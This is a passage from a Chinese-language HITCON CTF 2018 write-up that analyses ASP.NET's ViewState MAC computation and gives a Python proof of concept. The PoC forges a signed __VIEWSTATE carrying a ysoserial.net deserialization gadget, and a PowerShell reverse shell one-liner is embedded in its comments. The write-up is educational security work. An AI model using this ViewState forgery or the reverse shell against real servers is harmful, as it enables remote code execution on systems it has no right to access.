+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;File: ndp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;fx&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;src&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;xsp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;system&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Web&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Configuration&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;MachineKeySection.cs
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;852&lt;/span&gt;: [Obsolete(OBSOLETE_CRYPTO_API_MESSAGE)]
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;853&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;internal&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] HashData(&lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] buf, &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] modifier, &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; start, &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; length)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;854&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;855&lt;/span&gt;: EnsureConfig();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;856&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;857&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (s_config.Validation == MachineKeyValidation.MD5)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;858&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; HashDataUsingNonKeyedAlgorithm(&lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;, buf, modifier, start, length, s_validationKey);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;859&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_UseHMACSHA) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;860&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt; [] hash = GetHMACSHA1Hash(buf, modifier, start, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;861&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (hash != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;862&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hash;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;863&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;864&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_CustomValidationTypeIsKeyed) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;865&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; HashDataUsingKeyedAlgorithm(KeyedHashAlgorithm.Create(_CustomValidationName),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;866&lt;/span&gt;: buf, modifier, start, length, s_validationKey);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;867&lt;/span&gt;: } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;868&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; HashDataUsingNonKeyedAlgorithm(HashAlgorithm.Create(_CustomValidationName),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;869&lt;/span&gt;: buf, modifier, start, length, s_validationKey);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;870&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;871&lt;/span&gt;: }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;第 1219 行依據原 buf 長度加上 validationKey 長度和 modifier 長度得到 totalLength，並分配一個長度為 totalLength 的 &lt;code&gt;byte[]&lt;/code&gt; 陣列 bAll，第 1222 行先將原 Buffer 複製到 bAll 從位置 0 開始放置，第 1224 行會將 modifier 複製到 bAll 從位置 length 開始放置，這邊神奇的事情就發生了，第 1226 行將 validationKey 複製到 bAll 時居然又是從位置 length 開始放置，換句話說，如果 validationKey 長度大於等於 modifier 長度的話，validationKey 將會完整把 modifier 覆蓋過去。而 modifier 取得的地方是在最初 &lt;code&gt;ObjectStateFormatter.Serialize(object stateGraph, Purpose purpose)&lt;/code&gt; 的第 800 行呼叫的 &lt;code&gt;GetMacKeyModifier()&lt;/code&gt; 函式，長度固定會回傳 4 bytes，顯然這道題目的 validationKey 是足夠長到能覆蓋它。繼續往下看到第 1231 行，呼叫 &lt;code&gt;UnsafeNativeMethods.GetSHA1Hash&lt;/code&gt; 傳入 bAll 獲得最終的 MAC Hash 值，但可惜這個函式是 Native，所以沒有乾淨的 Source Code，經過幾次簡單黑箱嘗試會發現，這個函式雖然名為 &lt;code&gt;GetSHA1Hash&lt;/code&gt;，但其實是障眼法，它並不只會回傳 SHA1 Hash，在此處它還會回傳 MD5 的 Hash 值。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;File: ndp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;fx&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;src&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;xsp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;system&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Web&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Configuration&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;MachineKeySection.cs
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1216&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] HashDataUsingNonKeyedAlgorithm(HashAlgorithm hashAlgo, &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] buf, &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] modifier,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1217&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; start, &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; length, &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] validationKey)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1218&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1219&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; totalLength = length + validationKey.Length + ((modifier != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) ? modifier.Length : &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1220&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt; [] bAll = &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[totalLength];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1221&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1222&lt;/span&gt;: Buffer.BlockCopy(buf, start, bAll, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1223&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (modifier != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1224&lt;/span&gt;: Buffer.BlockCopy(modifier, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, bAll, length, modifier.Length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1225&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1226&lt;/span&gt;: Buffer.BlockCopy(validationKey, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, bAll, length, validationKey.Length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1227&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (hashAlgo != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1228&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashAlgo.ComputeHash(bAll);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1229&lt;/span&gt;: } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1230&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] newHash = &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[MD5_HASH_SIZE];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1231&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; hr = UnsafeNativeMethods.GetSHA1Hash(bAll, bAll.Length, newHash, newHash.Length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1232&lt;/span&gt;: Marshal.ThrowExceptionForHR(hr);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1233&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; newHash;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1234&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;1235&lt;/span&gt;: }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;總結一下 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 的流程，先將物件 Serialize 成一串 Binary 資料，將這串 Serialized Binary Data 尾巴附加上 Validation Key 和 modifier 的 Binary 資料，但因為 modifier 會被 Validation Key 覆蓋，所以實際上是 Serialized Binary Data 加 Validation Key Binary 加 &lt;code&gt;0x00000000&lt;/code&gt; (modifier 被覆蓋但 4 bytes 空間還在，預設都是 0)。最後依據這串 Binary 作 MD5 拿到 MAC Hash，把 MAC Hash 添加到最初的 Serialized Binary Data 作 Base64 Encode，就可以得到簽章過合法的 &lt;code&gt;__VIEWSTATE&lt;/code&gt;！&lt;/p&gt;
+&lt;p&gt;簡單表示算法如下：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;MAC_HASH = MD5(serialized_data_binary &amp;#43; validation_key &amp;#43; 0x00000000 )
+VIEWSATE = Base64_Encode(serialized_data_binary &amp;#43; MAC_HASH)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;最後得出的 PoC：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashlib
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;Generate PowerShell reverse shell command
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;gt; powershell &amp;#34;[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&amp;#39;$c=New-Object Net.Sockets.TCPClient(&amp;#39;&amp;#39;127.0.0.1&amp;#39;&amp;#39;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{0}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;;while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2=$sb+&amp;#39;&amp;#39;PS &amp;#39;&amp;#39;+(pwd).Path+&amp;#39;&amp;#39;&amp;gt; &amp;#39;&amp;#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&amp;#39;))&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;Generate deserialization gadget by ysoserial.net
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;https://github.com/pwntester/ysoserial.net
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;gt; ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c &amp;#34;powershell -nop -enc {reverse shell command}&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;serialized_data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;{base64 encoded serialized data from ysoserial}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64decode(serialized_data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Get machine key by uploading .shtml file (Server Side Include)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;validation_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; bytes&lt;span style="color:#f92672"&gt;.&lt;/span&gt;fromhex(&lt;span style="color:#e6db74"&gt;&amp;#39;b07b0f97365416288cf0247cffdf135d25f6be87&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;MAC_Hash = MD5(serialized_data_binary + validation_key + 0x00000000 )
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;Simple stack trace to get MAC Hash:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;System.Web.UI.ObjectStateFormatter.Serialize(object stateGraph, Purpose purpose)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; MachineKeySection.GetEncodedData(byte[] buf, byte[] modifier, int start, ref int length)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; MachineKeySection.HashData(byte[] buf, byte[] modifier, int start, int length)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; HashDataUsingNonKeyedAlgorithm(HashAlgorithm hashAlgo, byte[] buf, byte[] modifier, int start, int length, byte[] validationKey)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; UnsafeNativeMethods.GetSHA1Hash(byte[] data, int dataSize, byte[] hash, int hashSize);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mac &lt;span style="color:#f92672"&gt;=&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(payload &lt;span style="color:#f92672"&gt;+&lt;/span&gt; validation_key &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\x00\x00\x00\x00&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;digest()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64&lt;span style="color:#f92672"&gt;.&lt;/span&gt;b64encode(payload &lt;span style="color:#f92672"&gt;+&lt;/span&gt; mac)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(payload)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;讓我們立刻送送看 Payload，發現跳出不一樣的錯誤訊息！&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_05.png" alt="hitcon_ctf_2018_why_so_serials_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;成功收到 Reverse Shell 的連線，並在 &lt;code&gt;C:\this_1s_the_FL@g.txt&lt;/code&gt; 找到 FLAG 是 &lt;code&gt;hitcon{c0ngratulati0ns! you are .net king!}&lt;/code&gt;！&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_06.png" alt="hitcon_ctf_2018_why_so_serials_06" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;h3&gt;References:&lt;span class="hx:absolute hx:-mt-20" id="references"&gt;&lt;/span&gt;
+&lt;a href="#references" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/pwntester/ysoserial.net"target="_blank" rel="noopener"&gt;ysoserial.net&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.scrt.ch/2016/05/12/net-serialiception/"target="_blank" rel="noopener"&gt;.NET serialiception&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://msdn.microsoft.com/en-us/library/ms972976.aspx"target="_blank" rel="noopener"&gt;Understanding ASP.NET View State&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection"target="_blank" rel="noopener"&gt;OWASP - Server-Side Includes (SSI) Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf"target="_blank" rel="noopener"&gt;BlackHat - Friday the 13th: JSON Attacks by Alvaro Muñoz and Oleksandr Mirosh&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://referencesource.microsoft.com/"target="_blank" rel="noopener"&gt;Microsoft - .NET Framework Reference Source&lt;/a&gt;&lt;/li&gt;
